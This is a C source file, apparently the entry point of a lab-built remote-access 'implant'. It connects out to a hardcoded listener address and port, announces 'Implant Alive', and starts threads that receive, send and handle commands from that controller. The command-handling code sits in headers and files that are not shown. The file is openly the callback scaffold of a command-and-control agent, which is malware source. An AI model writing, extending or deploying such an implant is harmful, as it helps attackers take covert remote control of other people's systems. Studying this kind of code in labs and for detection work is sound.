#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "implant.h"
#include "queue.h"
#include "agent_comms.h"
#include "agent_message_handler.h"

// Globals
// Receive Queue
Queue* receive_queue;
pthread_mutex_t receive_queue_lock;
// Send Queue
Queue* send_queue;
pthread_mutex_t send_queue_lock;

int connect_to_listener(char* ip_addr, int port){

    int sockfd;
    int status;
    char* buffer;
    char* message = "Implant Alive\n";
    struct sockaddr_in addr;
    pthread_t agent_receive_tid, agent_send_tid, agent_message_handler_tid;

    if (ip_addr == NULL || !port){
        printf("Bad IP or port\n");
        return -1;
    }

    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);

    if (inet_pton(AF_INET, ip_addr, &addr.sin_addr) <= 0){
        printf("inet_pton failed\n");
        return -1;
    }

    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0){
        printf("socket failed\n");
        return -1;
    }

    if ((status = connect(sockfd, (struct sockaddr*)&addr, sizeof(addr))) < 0){
        printf("connect failed\n");
        // printf("%s\n", strerror(errno));
        return -1;
    }
    
    // Start agent receive thread
    pthread_create(&agent_receive_tid, NULL, agent_receive, &sockfd);
    // Start agent send thread
    pthread_create(&agent_send_tid, NULL, agent_send, &sockfd);
    // Start agent message handler thread
    pthread_create(&agent_message_handler_tid, NULL, agent_handle_message, &sockfd);
    
    pthread_join(agent_receive_tid, NULL);
    pthread_join(agent_send_tid, NULL);
    pthread_join(agent_message_handler_tid, NULL);

    close(sockfd);
    return 0;
}

int main(int argc, char** argv){
    char* ip_addr = "10.0.2.15";
    int port = 55555;
    
    // Create receive queue
    receive_queue = createQueue(QUEUE_SIZE);
    pthread_mutex_init(&receive_queue_lock, NULL);
    // Create send queue
    send_queue = createQueue(QUEUE_SIZE);
    pthread_mutex_init(&send_queue_lock, NULL);
    
    connect_to_listener(ip_addr, port);
    return 0;
}